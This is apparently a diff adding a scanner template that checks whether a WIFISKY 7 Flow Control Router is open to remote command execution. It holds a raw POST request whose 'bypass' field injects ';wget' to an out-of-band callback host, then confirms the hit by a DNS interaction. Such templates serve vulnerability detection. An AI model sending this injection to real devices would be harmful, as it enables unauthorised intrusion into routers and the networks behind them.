@@ -1,0 +1,27 @@
+id: wifisky-7-flow-control-rce
+info:
+  name: WIFISKY 7 Flow Control Router RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+  description: |
+    WIFISKY 7 Flow Control Router index.php is vulnerable to remote command execution through crafted POST requests.
+
+http:
+  - raw:
+      - |
+        POST /portal/ibilling/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"type":5,"version":2,"bypass":";wget {{interactsh-url}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
